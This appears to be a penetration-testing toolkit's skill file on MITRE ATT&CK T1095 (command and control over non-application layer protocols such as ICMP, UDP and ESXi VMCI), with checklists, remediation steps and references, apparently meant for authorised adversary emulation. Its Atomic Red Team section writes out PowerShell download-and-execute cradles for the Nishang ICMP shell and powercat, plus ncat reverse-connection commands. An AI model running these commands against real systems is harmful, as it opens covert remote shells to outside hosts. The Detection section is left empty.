---
name: "T1095_non-application-layer-protocol"
description: "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1095
  - command-and-control
  - esxi
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1095"
tactic: "command-and-control"
all_tactics:
  - command-and-control
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1095"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-300
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1095 Non-Application Layer Protocol

## High-Level Description

Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.

## Kill Chain Phase

- Command and Control (TA0011)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Non-Application Layer Protocol technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Non-Application Layer Protocol
- [ ] Check Linux systems for indicators of Non-Application Layer Protocol
- [ ] Check macOS systems for indicators of Non-Application Layer Protocol
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: ICMP C2

This will attempt to start C2 Session Using ICMP. For information on how to set up the listener
refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/

**Supported Platforms:** windows

```powershell
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}
```

### Atomic Test 2: Netcat C2

Start C2 Session Using Ncat
To start the listener on a Linux device, type the following:
nc -l -p <port>

**Supported Platforms:** windows

```powershell
cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
```

**Dependencies:**

- ncat.exe must be available at specified location (#{ncat_exe})

### Atomic Test 3: Powercat C2

Start C2 Session Using Powercat
To start the listener on a Linux device, type the following:
nc -l -p <port>

**Supported Platforms:** windows

```powershell
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
```

### Atomic Test 4: Linux ICMP Reverse Shell using icmp-cnc

ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.
This method allows attackers to communicate and control compromised devices while remaining undetected.

For more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)

**Important Notes:**

- Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).
- Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].
- Root access is required.

**Supported Platforms:** linux

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Non-Application Layer Protocol by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1095 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.

### M1047 Audit

Periodically investigate ESXi hosts for open VMCI ports. Running the `lsof -A` command and inspecting results with a type of `SOCKET_VMCI` will reveal processes that have open VMCI ports.

### M1037 Filter Network Traffic

Filter network traffic to prevent use of protocols across the network boundary that are unnecessary. If VMCI is not required in ESXi environments, consider restricting guest virtual machines from accessing VMCI services.

### M1030 Network Segmentation

Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.

## Detection

### Detection of Non-Application Layer Protocols for C2

## Risk Assessment

| Finding                                             | Severity | Impact              |
| --------------------------------------------------- | -------- | ------------------- |
| Non-Application Layer Protocol technique applicable | High     | Command And Control |

## CWE Categories

| CWE ID  | Title                              |
| ------- | ---------------------------------- |
| CWE-300 | Channel Accessible by Non-Endpoint |

## References

- [Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023](https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/)
- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Cisco Synful Knock Evolution](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)
- [Microsoft ICMP](http://support.microsoft.com/KB/170292)
- [Cisco Blog Legacy Device Attacks](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)
- [Wikipedia OSI](http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29)
- [Atomic Red Team - T1095](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1095)
- [MITRE ATT&CK - T1095](https://attack.mitre.org/techniques/T1095)
